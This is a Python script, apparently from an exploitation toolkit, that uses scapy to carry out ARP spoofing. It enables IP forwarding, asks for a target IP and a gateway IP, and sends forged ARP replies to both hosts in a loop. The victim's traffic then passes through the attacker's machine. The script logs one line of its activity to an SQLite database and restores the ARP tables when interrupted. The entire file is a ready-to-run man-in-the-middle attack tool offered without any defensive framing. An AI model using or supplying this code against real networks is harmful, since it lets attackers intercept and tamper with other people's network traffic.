from scapy.all import Ether, ARP, srp, send
import time
import os
import sqlite3

conn = sqlite3.connect("Exploitation.db")
cur = conn.cursor()

def enable_iproute_linux():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path, "w") as f:
        f.write('1')
        
def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src




def spoof(y, target_ip, host_ip, verbose=True):
    # get the mac address of the target
    target_mac_addr = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac_addr, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac_addr = ARP().hwsrc
        db = "[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac_addr)
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac_addr))
        if y == False:
            cur.execute('''INSERT INTO ARP_Spoofing (id, Spoofing) VALUES (NULL, ?)''', (db,))
            conn.commit()
            y = True
    return y
        
        
def restore(target_ip, host_ip, verbose=True):
    # get the real MAC address of target
    target_mac_addr = get_mac(target_ip)
    # get the real MAC address of spoofed
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac_addr, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        db = "[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac)
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
        


enable_iproute_linux()       
target = input("Enter target IP address: ")
host = input("Enter default gateway IP address: ")

verbose = True
try:
    x = False
    y = False
    while True:  
        x = spoof(x, target, host, verbose)
        y = spoof(y, host, target, verbose)
        time.sleep(1)
except KeyboardInterrupt:
    print("[!] Detected CTRL+C ! Restoring network...")
    restore(target, host)
    restore(host, target)
    
    